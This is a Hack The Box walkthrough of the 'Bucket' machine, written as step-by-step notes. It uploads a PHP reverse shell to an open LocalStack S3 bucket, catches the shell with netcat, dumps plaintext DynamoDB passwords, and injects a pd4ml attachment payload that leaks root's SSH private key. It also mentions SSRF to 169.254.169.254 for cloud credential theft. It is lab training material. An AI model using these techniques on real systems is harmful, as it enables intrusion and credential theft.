@@ -1,0 +1,527 @@
+Bucket - Hack the Box - Medium Linux - AWS Local Stack CLI, S3 Bucket
+
+Ports open ssh and http: 22 80
+Need to add bucket.htb to hosts file
+We type in index.html and index.php to see what type of files are being served at the root directory.
+
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $gobuster dir -u http://bucket.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x html -o gobuster-bucket.htb.out 
+====================================================================================================================================
+
+After running gobuster in the background, we can now manually look at the webpage. In firefox we hit control shift i to get the
+web developers console which if we go to the networks tab provides even more info regarding the different pages that are provided
+when a request is initated.
+
+We see that it makes request to s3.bucket.htb we add that to our hosts file.
+We go to the page and get the following:
+Commands and Output:
+====================================================================================================================================
+{"status": "running"}
+====================================================================================================================================
+
+We see amazon stuff "amz", we will change our gobuster and instead focus on the subdomain s3 and rid ourselves of the html extension
+and instead focus directoies.
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $curl --head s3.bucket.htb
+HTTP/1.1 404 
+Date: Sat, 24 Apr 2021 20:11:59 GMT
+Server: hypercorn-h11
+content-type: text/html; charset=utf-8
+content-length: 21
+access-control-allow-origin: *
+access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
+access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging
+access-control-expose-headers: x-amz-version-id
+
+====================================================================================================================================
+
+
+Commands and Output:
+====================================================================================================================================
+gobuster dir -u http://s3.bucket.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster-s3bucket.htb.out 
+====================================================================================================================================
+
+We will also install aws to our machine. We will try to connect the aws command line binary to the bucket.
+Google: AWS CLI Interface Documentation
+Commands and Output:
+====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $sudo apt install awscli -y
+====================================================================================================================================
+
+
+Commands and Output:
+====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $aws --endpoint-url http://s3.bucket.htb s3 ls
+Unable to locate credentials. You can configure credentials by running "aws configure".
+====================================================================================================================================
+
+We can configure the local box to try and get access, we use random keys and are allowed access. Reason why this works is because 
+the endpoint is local stack and not aws. Runs aws on own box so that we can run our instance and not pay licensing fees.
+Commands and Output:
+====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $aws configure
+AWS Access Key ID [None]: hackme
+AWS Secret Access Key [None]: pwned 
+Default region name [None]: 
+Default output format []: 
+┌─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $aws --endpoint-url http://s3.bucket.htb s3 ls
+2021-04-24 13:19:05 adserver
+====================================================================================================================================
+
+On production you would be looking for a server side request forgery inside of bucket and have it do a request to 169.254.169.254
+which is a magical api endpoint from amazon, when curled you can go into the IAM credentials and pull the secrity credntials from the
+box and potetnially get a secret key and do lateral movements.
+
+Google: aws pentest 169.254.169.254 iam takeover
+https://rhinosecuritylabs.com/cloud-security/aws-security-vulnerabilities-perspective/
+
+if interested.
+
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $aws --endpoint-url http://s3.bucket.htb s3 ls adserver
+                           PRE images/
+2021-04-24 13:27:05       5344 index.html
+====================================================================================================================================
+
+We can attempt to upload a reverse php shell with the following command
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $aws --endpoint-url http://s3.bucket.htb s3 cp rev.php s3://adserver/
+upload: ./rev.php to s3://adserver/rev.php
+====================================================================================================================================
+
+Once we visit: http://bucket.htb/rev.php
+We can get a working shell.
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $nc -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.212.
+Ncat: Connection from 10.10.10.212:38362.
+Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 20:40:15 up 56 min,  0 users,  load average: 0.03, 0.05, 0.17
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+====================================================================================================================================
+
+We see some interesting things in the root directory
+Commands and Output:
+====================================================================================================================================
+www-data@bucket:/$ ls -la .aws
+total 16
+drwxr-xr-x  2 root root 4096 Sep 23  2020 .
+drwxr-xr-x 21 root root 4096 Feb 10 12:49 ..
+-rw-------  1 root root   22 Sep 16  2020 config
+-rw-------  1 root root   64 Sep 16  2020 credentials
+====================================================================================================================================
+
+We look at the actie connections and notice docker is up and running, we may have to break into it.
+Commands and Output:
+====================================================================================================================================
+www-data@bucket:/$ ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:b9:e3:3a brd ff:ff:ff:ff:ff:ff
+    inet 10.10.10.212/24 brd 10.10.10.255 scope global ens160
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::250:56ff:feb9:e33a/64 scope global dynamic mngtmpaddr 
+       valid_lft 86389sec preferred_lft 14389sec
+    inet6 fe80::250:56ff:feb9:e33a/64 scope link 
+       valid_lft forever preferred_lft forever
+3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
+    link/ether 02:42:2d:3c:f7:df brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+4: br-bee97070fb20: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:f0:78:82:dc brd ff:ff:ff:ff:ff:ff
+    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-bee97070fb20
+       valid_lft forever preferred_lft forever
+    inet6 fe80::42:f0ff:fe78:82dc/64 scope link 
+       valid_lft forever preferred_lft forever
+6: vethb509006@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-bee97070fb20 state UP group default 
+    link/ether 12:5d:df:da:da:58 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet6 fe80::105d:dfff:feda:da58/64 scope link 
+       valid_lft forever preferred_lft forever
+====================================================================================================================================
+
+We look at active ports as well.
+Commands and Output:
+====================================================================================================================================
+www-data@bucket:/$ ss -lntp | column -t
+State   Recv-Q  Send-Q  Local             Address:Port  Peer  Address:Port  Process
+LISTEN  0       4096    127.0.0.1:37553   0.0.0.0:*
+LISTEN  0       4096    127.0.0.53%lo:53  0.0.0.0:*
+LISTEN  0       4096    127.0.0.1:4566    0.0.0.0:*
+LISTEN  0       128     0.0.0.0:22        0.0.0.0:*
+LISTEN  0       511     127.0.0.1:8000    0.0.0.0:*
+LISTEN  0       511     *:80              *:*
+LISTEN  0       128     [::]:22           [::]:*
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+www-data@bucket:/etc/apache2/sites-enabled$ ss -lntp | column -t
+State   Recv-Q  Send-Q  Local             Address:Port  Peer  Address:Port  Process
+LISTEN  0       4096    127.0.0.1:37553   0.0.0.0:*
+LISTEN  0       4096    127.0.0.53%lo:53  0.0.0.0:*
+LISTEN  0       4096    127.0.0.1:4566    0.0.0.0:*
+LISTEN  0       128     0.0.0.0:22        0.0.0.0:*
+LISTEN  0       511     127.0.0.1:8000    0.0.0.0:*
+LISTEN  0       511     *:80              *:*
+LISTEN  0       128     [::]:22           [::]:*
+www-data@bucket:/etc/apache2/sites-enabled$ grep 4566 000-default.conf 
+	ProxyPass / http://localhost:4566/
+	ProxyPassReverse / http://localhost:4566/
+====================================================================================================================================
+
+Based on obeservationwe can conlude that active connection to port 80 are redirected locally to port 4566 most likely a docker
+machine.
+Commands and Output:
+====================================================================================================================================
+www-data@bucket:/etc/apache2/sites-enabled$ grep -v '#' 000-default.conf 
+<VirtualHost 127.0.0.1:8000>
+	<IfModule mpm_itk_module>
+		AssignUserId root root
+	</IfModule>
+	DocumentRoot /var/www/bucket-app
+</VirtualHost>
+
+<VirtualHost *:80>
+	DocumentRoot /var/www/html
+	RewriteEngine On
+	RewriteCond %{HTTP_HOST} !^bucket.htb$
+	RewriteRule /.* http://bucket.htb/ [R]
+</VirtualHost>
+<VirtualHost *:80>
+	# if server name is s3.bucket.htb 4566 == Docker (LocalStack)
+	ProxyPreserveHost on
+	ProxyPass / http://localhost:4566/
+	ProxyPassReverse / http://localhost:4566/
+	<Proxy *>
+		 Order deny,allow
+		 Allow from all
+	 </Proxy>
+	ServerAdmin webmaster@localhost
+	ServerName s3.bucket.htb
+
+	ErrorLog ${APACHE_LOG_DIR}/error.log
+	CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+</VirtualHost>
+====================================================================================================================================
+
+Next we will use dynamodb to further enumerate and query for more info.
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $aws configure
+AWS Access Key ID [****************ckme]: 
+AWS Secret Access Key [****************wned]: 
+Default region name [us-east-1]: 
+Default output format [text]: json
+┌─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $aws --endpoint-url http://s3.bucket.htb dynamodb list-tables
+{
+    "TableNames": [
+        "users"
+    ]
+}
+====================================================================================================================================
+
+We can output the tables in regular text format
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $aws configure
+AWS Access Key ID [****************ckme]: 
+AWS Secret Access Key [****************wned]: 
+Default region name [us-east-1]: 
+Default output format [json]: text
+┌─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $aws --endpoint-url http://s3.bucket.htb dynamodb list-tables
+TABLENAMES	users
+┌─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users
+None	3	3
+PASSWORD	Management@#1@#
+USERNAME	Mgmt
+PASSWORD	Welcome123!
+USERNAME	Cloudadm
+PASSWORD	n2vM-<_K_Q:.Aa2
+USERNAME	Sysadm
+====================================================================================================================================
+
+Now we look for things owned by root, if we look from previous examples we noticed that the defautl apache pointed to web bucket
+run by root
+Commands and Output:
+====================================================================================================================================
+<VirtualHost 127.0.0.1:8000>    
+    <IfModule mpm_itk_module>    
+        AssignUserId root root    
+    </IfModule>    
+    DocumentRoot /var/www/bucket-app    
+</VirtualHost>    
+====================================================================================================================================
+
+If we go to that directory we find a special attribute depsite not being able to enter the directory.
+Commands and Output:
+====================================================================================================================================
+www-data@bucket:/var/www$ ls
+bucket-app  html
+www-data@bucket:/var/www$ ls -l
+total 8
+drwxr-x---+ 4 root root 4096 Feb 10 12:29 bucket-app
+drwxr-xr-x  2 root root 4096 Apr 24 21:31 html
+www-data@bucket:/var/www$ lsattr bucket-app/
+www-data@bucket:/var/www$ getfacl bucket-app/
+# file: bucket-app/
+# owner: root
+# group: root
+user::rwx
+user:roy:r-x
+group::r-x
+mask::r-x
+other::---
+====================================================================================================================================
+
+Apparently using getfacl, get access lists, the roy user can read and execute. We have to pivot to roy.
+We will try each cred we obtained on roy. The sysadm password allows us in.
+Commands and Output:
+====================================================================================================================================
+www-data@bucket:/var/www$ su - roy
+Password: 
+roy@bucket:~$ whoami
+roy
+roy@bucket:~$ ls
+project  user.txt
+====================================================================================================================================
+
+Once inside we go back to the buckets direcotory that root owns and see if we can figure out what the indes.php indicates running on
+port 8000
+Commands and Output:
+====================================================================================================================================
+<?php
+require 'vendor/autoload.php';
+use Aws\DynamoDb\DynamoDbClient;
+if($_SERVER["REQUEST_METHOD"]==="POST") {
+        if($_POST["action"]==="get_alerts") {
+                date_default_timezone_set('America/New_York');
+                $client = new DynamoDbClient([
+                        'profile' => 'default',
+                        'region'  => 'us-east-1',
+                        'version' => 'latest',
+                        'endpoint' => 'http://localhost:4566'
+                ]);
+
+                $iterator = $client->getIterator('Scan', array(
+                        'TableName' => 'alerts',
+                        'FilterExpression' => "title = :title",
+                        'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
+                ));
+
+                foreach ($iterator as $item) {
+                        $name=rand(1,10000).'.html';
+                        file_put_contents('files/'.$name,$item["data"]);
+                }
+====================================================================================================================================
+
+Now we have to epxloit this, create alerts table, dynamo db only showed users table. Create alert with ransomware in title putting data
+pd4ml will use.
+https://pd4ml.com/cookbook/pdf-attachments.htm
+Commands and Output:
+====================================================================================================================================
+    <pd4ml:attachment src="file:o:/work/DXL.pdf"   
+              description="attachment sample"   
+              icon="Area" height=18 width=108/> <font color=blue><u>Clickable area</u></font>
+====================================================================================================================================
+
+Attach a /etc/passwd inside a pdf that is generated. We will start doing port forwards to get the using ssh
+
+Commands and Output:
+====================================================================================================================================
+use konami code for ssh 
+shift ~ shift c
+roy@bucket:~$ 
+ssh> -L 8000:127.0.0.1:8000
+Forwarding port.
+====================================================================================================================================
+
+Now we have to create dynamodb create table awscli
+dynamodb create table aws cli
+https://docs.aws.amazon.com/cli/latest/reference/dynamodb/create-table.html
+
+Commands and Output:
+====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $aws --endpoint-url http://s3.bucket.htb dynamodb create-table \
+    --table-name alerts \
+    --attribute-definitions AttributeName=title,AttributeType=S \
+    --key-schema AttributeName=title,KeyType=HASH \
+    --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5
+{
+    "TableDescription": {
+        "AttributeDefinitions": [
+            {
+                "AttributeName": "title",
+                "AttributeType": "S"
+            }
+        ],
+        "TableName": "alerts",
+        "KeySchema": [
+            {
+                "AttributeName": "title",
+                "KeyType": "HASH"
+            }
+        ],
+        "TableStatus": "ACTIVE",
+        "CreationDateTime": 1619305976.91,
+        "ProvisionedThroughput": {
+            "LastIncreaseDateTime": 0.0,
+            "LastDecreaseDateTime": 0.0,
+            "NumberOfDecreasesToday": 0,
+            "ReadCapacityUnits": 5,
+            "WriteCapacityUnits": 5
+        },
+        "TableSizeBytes": 0,
+        "ItemCount": 0,
+        "TableArn": "arn:aws:dynamodb:us-east-1:000000000000:table/alerts"
+    }
+}
+┌─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $aws --endpoint-url http://s3.bucket.htb dynamodb list-tables
+{
+    "TableNames": [
+        "alerts",
+        "users"
+    ]
+}
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $aws --endpoint-url http://s3.bucket.htb dynamodb list-tables
+{
+    "TableNames": [
+        "alerts",
+        "users"
+    ]
+}
+┌─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $aws --endpoint-url http://s3.bucket.htb dynamodb put-item --table-name alerts --item file://ransomware.json
+{
+    "ConsumedCapacity": {
+        "TableName": "alerts",
+        "CapacityUnits": 1.0
+    }
+}
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $curl -X POST -d "action=get_alerts" http://127.0.0.1:8000 -v
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 127.0.0.1:8000...
+* Connected to 127.0.0.1 (127.0.0.1) port 8000 (#0)
+> POST / HTTP/1.1
+> Host: 127.0.0.1:8000
+> User-Agent: curl/7.74.0
+> Accept: */*
+> Content-Length: 17
+> Content-Type: application/x-www-form-urlencoded
+> 
+* upload completely sent off: 17 out of 17 bytes
+* Mark bundle as not supporting multiuse
+* HTTP 1.0, assume close after body
+< HTTP/1.0 500 Internal Server Error
+< Date: Sat, 24 Apr 2021 23:23:17 GMT
+< Server: Apache/2.4.41 (Ubuntu)
+< Content-Length: 0
+< Connection: close
+< Content-Type: text/html; charset=UTF-8
+< 
+* Closing connection 0
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+aws --endpoint-url http://s3.bucket.htb dynamodb create-table     --table-name alerts     --attribute-definitions AttributeName=title,AttributeType=S     --key-schema AttributeName=title,KeyType=HASH     --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5
+aws --endpoint-url http://s3.bucket.htb dynamodb put-item --table-name alerts --item file://ransomware.json
+curl -X POST -d "action=get_alerts" http://127.0.0.1:8000
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bucket]
+└──╼ $cat ransomware.json 
+{"title":
+  {"S":"Ransomware"},
+  "data" :
+  {
+    "S":"<html><pd4ml:attachment src='file:///root/.ssh/id_rsa' description='attachment sample' icon='Paperclip'/>"
+  }
+}
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bucket/ssh]
+└──╼ $chmod 600 id_rsa 
+┌─[user@parrot-virtual]─[~/htb/bucket/ssh]
+└──╼ $ssh root@bucket.htb -i id_rsa 
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
